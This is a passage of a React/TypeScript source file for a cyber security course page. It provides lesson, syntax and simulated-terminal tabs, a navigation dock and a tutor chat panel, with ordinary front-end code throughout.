    const newHistory = [...terminalHistory, `$ ${terminalInput}`];
    const output = simulateCommand(terminalInput);
    
    setTerminalHistory([...newHistory, ...output, '']);
    setCommandHistory(prev => [...prev, terminalInput]);
    setTerminalInput('');
    setHistoryIndex(-1);
  };

  const handleTerminalKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length > 0) {
        const newIndex = historyIndex === -1 ? commandHistory.length - 1 : Math.max(0, historyIndex - 1);
        setHistoryIndex(newIndex);
        setTerminalInput(commandHistory[newIndex]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex !== -1) {
        const newIndex = historyIndex + 1;
        if (newIndex >= commandHistory.length) {
          setHistoryIndex(-1);
          setTerminalInput('');
        } else {
          setHistoryIndex(newIndex);
          setTerminalInput(commandHistory[newIndex]);
        }
      }
    }
  };

  // Scroll terminal to bottom when history updates
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalHistory, activeContentTab]);

  // Sync slug with active module if needed, or just default to module-1
  useEffect(() => {
    if (slug && slug !== activeModuleId) {
       const found = courseData.find(m => m.id === slug);
       if (found) setActiveModuleId(slug);
    }
  }, [slug]);

  if (!activeModule || !activeLesson) return <div>Loading...</div>;

  return (
    <div className="flex bg-[#121212] text-white overflow-hidden font-sans" style={{ height: 'calc(100vh / 1.1)', zoom: '110%' }}>
      {/* Sidebar */}
      <Sidebar 
         activeTab={activeTab} 
         setActiveTab={setActiveTab}
         activeModuleId={activeModuleId}
         setActiveModuleId={setActiveModuleId}
         activeLessonIndex={activeLessonIndex}
         setActiveLessonIndex={setActiveLessonIndex}
         completedLessons={completedLessons}
      />

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col h-full overflow-hidden relative">
         {/* Top Navigation Bar (Breadcrumbs & Tools) */}
         <div className="h-[50px] bg-[#1e1e1e] border-b border-[#333] flex items-center justify-between px-4 z-20">
            <div className="flex items-center gap-2 text-sm text-gray-400">
               <span className="cursor-pointer hover:text-white" onClick={() => navigate('/cyber-security-intermediate')}>Cyber Security Intermediate</span>
               <ChevronRight className="w-4 h-4" />
               <span className="text-white truncate max-w-[300px]">{activeLesson.title}</span>
            </div>
            <div className="flex items-center gap-4">
               <button onClick={toggleTheme} className="text-gray-400 hover:text-white" title="Toggle Theme">
                  {isDark ? '☀' : '☾'}
               </button>
               <span className="text-xs font-bold bg-[#333] px-2 py-1 rounded text-white">EN</span>
            </div>
         </div>

         {/* Content Scroll Area - Wraps Hero, Tabs, and Body */}
         <div id="content-scroll-area" className="flex-1 overflow-y-auto w-full relative">
             {/* Hero / Banner Section */}
             <div className="relative w-full h-[300px] shrink-0">
                {/* Background Image Overlay */}
                <div className="absolute inset-0 bg-gradient-to-t from-[#121212] via-transparent to-black/60 z-10" />
                <img 
                  src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=2070&auto=format&fit=crop" 
                  alt="Cyber Security" 
                  className="w-full h-full object-cover"
                />
                
                {/* Content Over Image */}
                <div className="absolute bottom-0 left-0 w-full p-8 z-20">
                   <h1 className="text-4xl font-bold text-white mb-2 shadow-sm drop-shadow-lg">
                      {activeModule.id.split('-')[1]}.{activeLessonIndex + 1} {activeLesson.title}
                   </h1>
                   <div className="flex items-center gap-2 text-white/80 animate-bounce mt-4 cursor-pointer" onClick={() => {
                      document.getElementById('content-scroll-area')?.scrollTo({ top: 300, behavior: 'smooth' });
                   }}>
                      <span className="text-sm font-medium">Scroll to begin</span>
                      <ChevronDown className="w-4 h-4" />
                   </div>
                </div>

                {/* Navigation Arrows */}
                <button 
                   className="absolute left-0 top-1/2 -translate-y-1/2 z-20 bg-green-600/90 hover:bg-green-500 text-white p-2 rounded-r-lg shadow-lg transition-transform hover:scale-110"
                   onClick={() => {
                      if (activeLessonIndex > 0) setActiveLessonIndex(activeLessonIndex - 1);
                   }}
                   disabled={activeLessonIndex === 0}
                   style={{ opacity: activeLessonIndex === 0 ? 0 : 1 }}
                >
                   <ChevronRight className="w-6 h-6 rotate-180" />
                </button>
                <button 
                   className="absolute right-0 top-1/2 -translate-y-1/2 z-20 bg-green-600/90 hover:bg-green-500 text-white p-2 rounded-l-lg shadow-lg transition-transform hover:scale-110"
                   onClick={() => {
                      if (activeLessonIndex < activeModule.lessons.length - 1) setActiveLessonIndex(activeLessonIndex + 1);
                   }}
                   disabled={activeLessonIndex === activeModule.lessons.length - 1}
                   style={{ opacity: activeLessonIndex === activeModule.lessons.length - 1 ? 0 : 1 }}
                >
                   <ChevronRight className="w-6 h-6" />
                </button>
             </div>

             {/* Tabs Navigation */}
             <div className="sticky top-0 z-30 flex items-center gap-6 px-8 lg:px-16 border-b border-[#333] bg-[#1e1e1e] shrink-0">
                <button 
                   onClick={() => setActiveContentTab('lesson')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'lesson' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <BookOpen className="w-4 h-4" /> Lesson
                </button>
                <button 
                   onClick={() => setActiveContentTab('syntax')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'syntax' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <Code className="w-4 h-4" /> Syntax
                </button>
                <button 
                   onClick={() => setActiveContentTab('terminal')}
                   className={clsx("py-4 text-sm font-medium border-b-2 transition-colors flex items-center gap-2", activeContentTab === 'terminal' ? "border-[#00bceb] text-white" : "border-transparent text-gray-400 hover:text-white")}
                >
                   <Terminal className="w-4 h-4" /> Terminal
                </button>
             </div>

             {/* Content Body */}
             <div className="p-8 lg:px-16 w-full">
            <div className="max-w-screen-2xl mx-auto grid grid-cols-1 xl:grid-cols-3 gap-8">
               <div className="xl:col-span-2">
               {activeContentTab === 'lesson' && (
                  <>
                     <div className="prose prose-invert prose-lg max-w-none">
                        <div dangerouslySetInnerHTML={{ __html: activeLesson.content }} />
                     </div>

                     {/* Bottom Navigation */}
                     <div className="mt-12 flex justify-between items-center border-t border-[#333] pt-8 pb-12">
                        <button 
                           onClick={() => {
                              if (activeLessonIndex > 0) setActiveLessonIndex(activeLessonIndex - 1);
                           }}
                           disabled={activeLessonIndex === 0}
                           className={`flex items-center gap-2 px-6 py-3 rounded-full font-medium transition-colors ${
                              activeLessonIndex === 0 
                              ? 'text-gray-600 cursor-not-allowed' 
                              : 'bg-[#2d2d2d] hover:bg-[#3e3e42] text-white'
                           }`}
                        >
                           <ChevronRight className="w-4 h-4 rotate-180" />
                           Previous
                        </button>

                        <button 
                           onClick={() => {
                              // Mark current as completed
                              setCompletedLessons(prev => new Set(prev).add(`${activeModuleId}-${activeLessonIndex}`));
                              if (activeLessonIndex < activeModule.lessons.length - 1) {
                                 setActiveLessonIndex(activeLessonIndex + 1);
                              }
                           }}
                           className="flex items-center gap-2 px-6 py-3 rounded-full font-medium bg-green-600 hover:bg-green-500 text-white transition-colors shadow-lg shadow-green-900/20"
                        >
                           {activeLessonIndex === activeModule.lessons.length - 1 ? 'Finish Module' : 'Next Topic'}
                           <ChevronRight className="w-4 h-4" />
                        </button>
                     </div>
                  </>
               )}

               {activeContentTab === 'syntax' && (
                  <div className="space-y-6 animate-fadeIn">
                     <h2 className="text-2xl font-bold text-white mb-6">Syntax & Resources</h2>
                     {activeLesson.syntax ? (
                        activeLesson.syntax.map((item, idx) => (
                           <div key={idx} className="bg-[#252526] border border-[#333] rounded-lg overflow-hidden">
                              <div className="px-4 py-2 bg-[#2d2d2d] border-b border-[#333] font-mono text-sm text-[#00bceb]">
                                 {item.title}
                              </div>
                              <div className="p-4 text-sm text-gray-300">
                                 <div dangerouslySetInnerHTML={{ __html: item.content }} />
                              </div>
                           </div>
                        ))
                     ) : (
                        <div className="text-center py-12 text-gray-500 bg-[#252526]/50 rounded-lg border border-[#333] border-dashed">
                           <Code className="w-12 h-12 mx-auto mb-3 opacity-50" />
                           <p>No syntax examples available for this lesson.</p>
                        </div>
                     )}
                  </div>
               )}

               {activeContentTab === 'terminal' && (
                  <div className="h-full flex flex-col animate-fadeIn">
                     <div className="bg-[#1e1e1e] rounded-lg border border-[#333] shadow-2xl overflow-hidden flex flex-col h-[500px]">
                        <div className="px-4 py-2 bg-[#2d2d2d] border-b border-[#333] flex items-center justify-between">
                           <span className="text-xs font-mono text-gray-400">root@kali:~</span>
                           <div className="flex gap-1.5">
                              <div className="w-2.5 h-2.5 rounded-full bg-red-500/50" />
                              <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50" />
                              <div className="w-2.5 h-2.5 rounded-full bg-green-500/50" />
                           </div>
                        </div>
                        <div 
                           ref={terminalRef}
                           className="flex-1 p-4 font-mono text-sm overflow-y-auto custom-scrollbar bg-black/90 text-green-500"
                           onClick={() => document.getElementById('terminal-input')?.focus()}
                        >
                           {terminalHistory.map((line, idx) => (
                              <div key={idx} className="whitespace-pre-wrap mb-1">{line}</div>
                           ))}
                           <form onSubmit={handleTerminalSubmit} className="flex items-center mt-2">
                              <span className="mr-2 text-green-500 font-bold">$</span>
                              <input
                                 id="terminal-input"
                                 type="text"
                                 value={terminalInput}
                                 onChange={(e) => setTerminalInput(e.target.value)}
                                 onKeyDown={handleTerminalKeyDown}
                                 className="flex-1 bg-transparent border-none outline-none text-green-500 font-mono"
                                 autoComplete="off"
                                 autoFocus
                              />
                           </form>
                        </div>
                     </div>
                     
                     {/* Quick Commands */}
                     <div className="mt-6">
                        <h3 className="text-sm font-semibold text-gray-400 mb-3 uppercase tracking-wider">Available Commands</h3>
                        <div className="flex flex-wrap gap-2">
                           {activeLesson.terminalCommands?.map(cmd => (
                              <button
                                 key={cmd}
                                 onClick={() => {
                                    setTerminalInput(cmd);
                                    document.getElementById('terminal-input')?.focus();
                                 }}
                                 className="px-3 py-1.5 bg-[#2d2d2d] hover:bg-[#3e3e42] border border-[#333] rounded text-xs font-mono text-blue-400 transition-colors"
                              >
                                 {cmd}
                              </button>
                           )) || (
                              <p className="text-sm text-gray-500">No specific commands suggested for this lesson.</p>
                           )}
                        </div>
                     </div>
                  </div>
               )}
               </div>
               
               {/* Chat Panel Column */}
               <div className="hidden xl:block xl:col-span-1">
                  <ChatPanel isDark={isDark} messages={messages} loading={loading} onSend={handleSendMessage} />
               </div>
            </div>
         </div>
         </div>
      </div>
    </div>
  );
};


export default CourseLearningCyberSecurityIntermediate;

const FloatingDock: React.FC<{ isDark: boolean; onToggleTheme: () => void; onPrevModule: () => void; disabledPrev: boolean; onNextModule: () => void; disabledNext: boolean; onHome: () => void } > = ({ isDark, onToggleTheme, onPrevModule, disabledPrev, onNextModule, disabledNext, onHome }) => (
  <div className={`fixed top-4 left-1/2 -translate-x-1/2 z-40 rounded-2xl shadow-lg border ${isDark ? 'bg-white/10 border-white/20' : 'bg-white/60 border-gray-300/40'} backdrop-blur-xl px-3 py-2 flex items-center gap-2`} aria-label="Quick actions dock">
    <button
      onClick={onHome}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${isDark ? 'bg-white/10 text-white hover:bg-white/15' : 'bg-gray-100 text-gray-900 hover:bg-gray-200'}`}
      aria-label="Go to Student Portal"
      title="Student Portal"
    >
      <span className="inline-flex items-center gap-1">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M3 10.5L12 3l9 7.5v9a1.5 1.5 0 0 1-1.5 1.5H4.5A1.5 1.5 0 0 1 3 19.5v-9z" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
          <path d="M9 21V12h6v9" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
        Home
      </span>
    </button>
    <div className="mx-1 h-6 w-px bg-gray-300/60 dark:bg-white/20" aria-hidden />
    <button
      onClick={onToggleTheme}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${isDark ? 'bg-white/10 text-white hover:bg-white/15' : 'bg-gray-100 text-gray-900 hover:bg-gray-200'}`}
      aria-label={isDark ? 'Switch to light mode' : 'Switch to dark mode'}
    >
      {isDark ? 'Light Mode' : 'Dark Mode'}
    </button>
    <button
      onClick={onPrevModule}
      disabled={disabledPrev}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${disabledPrev ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : (isDark ? 'bg-black text-white hover:bg-gray-900' : 'bg-blue-600 text-white hover:bg-blue-500')}`}
      aria-label="Go to previous module"
    >
      Previous Module
    </button>
    <button
      onClick={onNextModule}
      disabled={disabledNext}
      className={`px-3 py-2 rounded-lg text-sm font-medium ${disabledNext ? 'bg-gray-300 text-gray-500 cursor-not-allowed' : (isDark ? 'bg-black text-white hover:bg-gray-900' : 'bg-blue-600 text-white hover:bg-blue-500')}`}
      aria-label="Go to next module"
    >
      Next Module
    </button>
  </div>
);

const ChatPanel: React.FC<{ isDark: boolean; messages: ChatMessage[]; loading: boolean; onSend: (text: string) => void }> = ({ isDark, messages, loading, onSend }) => {
  const [text, setText] = React.useState('');

  // Typing animation state for the latest assistant message
  const [typingIndex, setTypingIndex] = React.useState<number | null>(null);
  const [typedContent, setTypedContent] = React.useState('');
  const typingTimerRef = React.useRef<number | null>(null);

  React.useEffect(() => {
    if (!messages.length) return;
    const lastIndex = messages.length - 1;
    const last = messages[lastIndex];

    // Start typing animation only for the newest assistant message
    if (last.role === 'assistant') {
      // If already animating this message, skip
      if (typingIndex === lastIndex && typedContent.length === last.content.length) return;

      // Clear any previous timer
      if (typingTimerRef.current) {
        window.clearInterval(typingTimerRef.current);
        typingTimerRef.current = null;
      }

      setTypingIndex(lastIndex);
      setTypedContent('');
      let i = 0;
      const full = last.content;
      const speedMs = 18; // smooth typing speed
      typingTimerRef.current = window.setInterval(() => {
        i = Math.min(i + 1, full.length);
        setTypedContent(full.slice(0, i));
        if (i >= full.length) {
          if (typingTimerRef.current) {
            window.clearInterval(typingTimerRef.current);
            typingTimerRef.current = null;
          }
        }
      }, speedMs);
    }

    // Cleanup when messages change or component unmounts
    return () => {
      if (typingTimerRef.current) {
        window.clearInterval(typingTimerRef.current);
        typingTimerRef.current = null;
      }
    };
  }, [messages]);

  return (
    <aside className={`${isDark ? 'bg-gradient-to-br from-white/15 to-white/5 border-white/20' : 'bg-gradient-to-br from-white/70 to-white/40 border-gray-300/40'} backdrop-blur-2xl backdrop-saturate-150 w-full lg:sticky lg:top-4 lg:self-start h-[calc(100vh-240px)] min-h-[520px] rounded-2xl border p-4 flex flex-col shadow-lg ring-1 ${isDark ? 'ring-white/10' : 'ring-white/60'}`
      }>
        {/* Chat Header */}
        <div className={`flex flex-col items-start gap-0.5 pb-3 border-b ${isDark ? 'border-white/20' : 'border-[#14A38F]/30'} ${isDark ? 'bg-white/10' : 'bg-white/60'} backdrop-blur-xl rounded-lg px-3 py-2`}>
          <h3 className={`text-sm font-medium ${isDark ? 'text-white' : 'text-[#14A38F]'}`}>
            Personal Teacher
          </h3>
          <span className={`text-xs ${isDark ? "text-gray-400" : "text-gray-500"}`}>
            Ask me anything about the components
          </span>
        </div>

        {/* Messages List */}
        <div className={`flex-1 min-h-0 overflow-y-auto space-y-4 ${isDark ? "text-gray-200" : "text-gray-800"}`}>
          {messages.map((msg, idx) => (
            <div key={idx} className={`flex ${msg.role === "assistant" ? "justify-start" : "justify-end"}`}>
              <div
                className={`${
                  msg.role === "assistant"
                    ? isDark
                      ? "bg-white/10 backdrop-blur-xl text-white border border-white/20"
                      : "bg-[#14A38F] text-white border border-[#14A38F]"
                    : isDark
                    ? "bg-black/60 backdrop-blur-xl text-white border border-white/20"
                    : "bg-blue-600/70 backdrop-blur-xl text-white border border-blue-300/40"
                } max-w-[85%] rounded-2xl px-4 py-3 shadow-sm whitespace-pre-wrap break-words leading-relaxed text-[15px]`}
              >
                {msg.role === "assistant" && idx === typingIndex && typedContent.length > 0
                  ? typedContent
                  : msg.content}
              </div>
            </div>
          ))}
        </div>

        {/* Input Area */}
        <div className="pt-4 border-t space-y-3">
          <div className={`flex items-center gap-2 ${isDark ? "bg-white/10 border-white/20" : "bg-white/60 border-gray-300/40"} backdrop-blur-xl rounded-xl border p-2 shadow-sm`}> 
            <button className={`p-2 rounded ${isDark ? "hover:bg-white/15" : "hover:bg-white"} shrink-0`} aria-label="Attach file">
              <Paperclip className={`h-5 w-5 ${isDark ? "text-white/80" : "text-gray-700"}`} />
            </button>
            <button className={`p-2 rounded ${isDark ? "hover:bg-white/15" : "hover:bg-white"} shrink-0`} aria-label="Voice input">
              <Mic className={`h-5 w-5 ${isDark ? "text-white/80" : "text-gray-700"}`} />
            </button>
            <input
              type="text"
              className={`flex-1 bg-transparent outline-none min-w-0 ${isDark ? "text-white placeholder-white/60" : "text-gray-900 placeholder-gray-600"}`}
              placeholder="Type..."
              value={text}
              onChange={(e) => setText(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === "Enter" && text.trim()) {
                  onSend(text.trim());
                }
              }}
            />
            <button
              className={`flex items-center justify-center w-8 h-8 rounded-md ${
                isDark ? 'bg-white text-gray-900' : 'bg-[#14A38F] text-white'
              } disabled:opacity-50 shrink-0`}
              onClick={() => text.trim() && onSend(text.trim())}
              disabled={loading}
            >
              <Send className="h-4 w-4" />
            </button>
          </div>
        </div>
    </aside>
  );
};
